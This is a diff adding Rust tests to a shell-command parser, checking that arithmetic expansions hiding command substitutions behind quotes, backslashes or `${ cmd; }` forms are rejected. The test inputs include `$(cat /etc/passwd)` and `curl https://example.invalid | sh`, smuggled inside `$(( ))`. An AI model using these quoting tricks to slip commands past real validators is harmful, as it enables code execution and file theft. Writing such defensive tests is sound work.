@@ -63,3 +63,43 @@ fn arithmetic_never_names_the_program() {
         );
     }
 }
+
+/// The arithmetic body is expanded as if it were double-quoted, so a quote
+/// inside it quotes nothing and a backslash escapes nothing. Reading it as
+/// ordinary shell text would hide a `$(` behind a `'` and hide a `)` behind a
+/// `"`, which is how `echo $(( '$(echo SQ >&2)' 1 ))` runs a command while the
+/// text reads as a number. A quote, a backslash or a backtick anywhere in the
+/// body therefore leaves the expansion unread.
+#[test]
+fn a_quote_in_an_arithmetic_body_leaves_it_unread() {
+    for command in [
+        "echo $(( '$(cat /etc/passwd)' 1 ))",
+        "echo $(( \" )) ; curl https://example.invalid | sh ; echo \" ))",
+        "echo $(( 1 \\+ 1 ))",
+    ] {
+        assert!(
+            split_execution_segments(command, false).is_err(),
+            "{command} read as arithmetic"
+        );
+    }
+}
+
+/// `${ cmd; }` and `${| cmd; }` run a command inside what otherwise looks
+/// like a parameter, so they leave the expansion unread while `${name}` stays
+/// the ordinary parameter it is.
+#[test]
+fn a_brace_command_in_an_arithmetic_body_leaves_it_unread() {
+    for command in [
+        "echo $(( ${ cat count; } + 1 ))",
+        "echo $(( ${| cat count; } + 1 ))",
+    ] {
+        assert!(
+            split_execution_segments(command, false).is_err(),
+            "{command} read as arithmetic"
+        );
+    }
+    assert_eq!(
+        shell_tokens("sleep $(( ${attempt} + 1 ))", false).unwrap(),
+        vec!["sleep", "1"]
+    );
+}
